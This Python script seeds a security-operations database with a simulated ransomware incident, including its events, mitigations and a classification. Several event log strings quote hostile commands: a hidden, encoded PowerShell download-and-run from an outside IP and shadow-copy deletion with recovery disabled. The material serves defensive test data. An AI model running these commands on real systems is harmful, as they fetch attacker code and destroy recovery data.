import sys
import os
import json
import datetime

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from domain.soc_models import (
    Incident, IncidentStatus, ThreatClassification, ClassificationState, 
    ThreatCategory, SecurityEvent, MitigationAction, MitigationStatus
)
import db.database as db

def seed_working_incident():
    print("Initializing Database...")
    db.init_db()

    now = datetime.datetime.now(datetime.UTC).isoformat()
    t1 = (datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=15)).isoformat()
    t2 = (datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=12)).isoformat()
    t3 = (datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=8)).isoformat()
    t4 = (datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=5)).isoformat()
    t5 = (datetime.datetime.now(datetime.UTC) - datetime.timedelta(minutes=2)).isoformat()

    incident_id = "INC-2026-0842"
    net_id = "NET-CORP"
    device_id = "DEV-CORP-WS1"

    events = [
        SecurityEvent(
            id="EVT-0842-1",
            timestamp=t1,
            network_id=net_id,
            device_id=device_id,
            source_type="Sysmon",
            event_type="ProcessCreate",
            raw_message="PowerShell executed with encoded command: powershell.exe -NoP -NonI -W Hidden -Enc JABzAHIA... DownloadString('http://185.220.101.5/beacon.ps1')",
            is_suspicious=True,
            extracted_entities={"ips": ["185.220.101.5"], "domains": ["beacon.c2.net"]}
        ),
        SecurityEvent(
            id="EVT-0842-2",
            timestamp=t2,
            network_id=net_id,
            device_id=device_id,
            source_type="EDR",
            event_type="ProcessInjection",
            raw_message="Process injection detected: powershell.exe (PID 6832) injected shellcode into explorer.exe (PID 4120). Thread created with RWX permissions.",
            is_suspicious=True,
            extracted_entities={"processes": ["explorer.exe", "powershell.exe"]}
        ),
        SecurityEvent(
            id="EVT-0842-3",
            timestamp=t3,
            network_id=net_id,
            device_id=device_id,
            source_type="Firewall",
            event_type="NetworkTraffic",
            raw_message="High-frequency TLS beaconing to external IP 185.220.101.5:443 with self-signed certificate. Jitter: 15%, Interval: 60s (Cobalt Strike Profile).",
            is_suspicious=True,
            extracted_entities={"ips": ["185.220.101.5"]}
        ),
        SecurityEvent(
            id="EVT-0842-4",
            timestamp=t4,
            network_id=net_id,
            device_id=device_id,
            source_type="Sysmon",
            event_type="ProcessCreate",
            raw_message="Ransomware precursor: cmd.exe spawned vssadmin.exe delete shadows /all /quiet followed by bcdedit /set {default} recoveryenabled No.",
            is_suspicious=True,
            extracted_entities={"commands": ["vssadmin delete shadows", "bcdedit"]}
        ),
        SecurityEvent(
            id="EVT-0842-5",
            timestamp=t5,
            network_id=net_id,
            device_id=device_id,
            source_type="FIM",
            event_type="FileModification",
            raw_message="Rapid bulk file encryption detected in C:\\Finance\\Q3_Reports\\. 124 files modified and renamed with '.raglock' extension. High entropy (7.98).",
            is_suspicious=True,
            extracted_entities={"extensions": [".raglock"], "files": ["Q3_Financials.xlsx.raglock"]}
        )
    ]

    mitigations = [
        MitigationAction(
            id="MIT-0842-01",
            incident_id=incident_id,
            action_type="ISOLATE_ENDPOINT",
            target_device_id=device_id,
            description="Sever all physical and wireless network adapters on FINANCE-PC-014 (10.0.0.14) to contain lateral propagation toward Domain Controller.",
            status=MitigationStatus.RECOMMENDED,
            timestamp=now
        ),
        MitigationAction(
            id="MIT-0842-02",
            incident_id=incident_id,
            action_type="TERMINATE_PROCESS",
            target_device_id=device_id,
            description="Kill rogue malicious processes (PID 6832 powershell.exe and infected explorer.exe child thread PID 4120).",
            status=MitigationStatus.RECOMMENDED,
            timestamp=now
        ),
        MitigationAction(
            id="MIT-0842-03",
            incident_id=incident_id,
            action_type="QUARANTINE_FILE",
            target_device_id=device_id,
            description="Isolate ransomware dropper payload 'malware_simulation.exe' and staging scripts into AES-256 encrypted .quarantine/ storage.",
            status=MitigationStatus.RECOMMENDED,
            timestamp=now
        ),
        MitigationAction(
            id="MIT-0842-04",
            incident_id=incident_id,
            action_type="BLOCK_C2_IP",
            target_device_id="DC-FW-01",
            description="Deploy perimeter edge firewall DROP rule for Command & Control IP 185.220.101.5 across TCP ports 80, 443, and 8080.",
            status=MitigationStatus.RECOMMENDED,
            timestamp=now
        ),
        MitigationAction(
            id="MIT-0842-05",
            incident_id=incident_id,
            action_type="REVOKE_CREDENTIALS",
            target_device_id="DEV-CORP-DC1",
            description="Force reset Kerberos ticket granting tokens (TGT) and rotate Active Directory credentials for account FINANCE\\jsmith.",
            status=MitigationStatus.RECOMMENDED,
            timestamp=now
        )
    ]

    classification = ThreatClassification(
        state=ClassificationState.THREAT,
        category=ThreatCategory.RANSOMWARE,
        confidence=0.98,
        severity="critical",
        rationale="Multi-stage adversary attack chain: PowerShell encoded loader (T1059.001) -> Process injection (T1055) -> C2 beaconing -> Volume shadow deletion (T1490) -> Rapid file encryption (T1486)."
    )

    incident = Incident(
        id=incident_id,
        network_id=net_id,
        affected_device_ids=[device_id],
        title="Cobalt Strike Beacon & Multi-Stage Ransomware Precursor",
        status=IncidentStatus.AWAITING_ANALYST_APPROVAL,
        threat_classification=classification,
        mitigation_actions=mitigations,
        created_at=t1,
        updated_at=now,
        analyst_assigned="SOC_LEAD_ANALYST",
        events=events
    )

    # Save events to database
    for e in events:
        db.save_record('events', e.id, e.model_dump(), 'network_id', e.network_id)
        print(f"  [+] Saved Event {e.id}")

    # Save mitigations to database
    for m in mitigations:
        db.save_record('mitigations', m.id, m.model_dump(), 'incident_id', m.incident_id)
        print(f"  [+] Saved Mitigation {m.id}")

    # Save incident to database
    db.save_record('incidents', incident.id, incident.model_dump(), 'network_id', incident.network_id)
    print(f"\n[SUCCESS] Seeded Working Incident: {incident_id}")
    print(f"  Title: {incident.title}")
    print(f"  Severity: {incident.threat_classification.severity.upper()}")
    print(f"  Mitigations Ready: {len(mitigations)}")

if __name__ == "__main__":
    seed_working_incident()
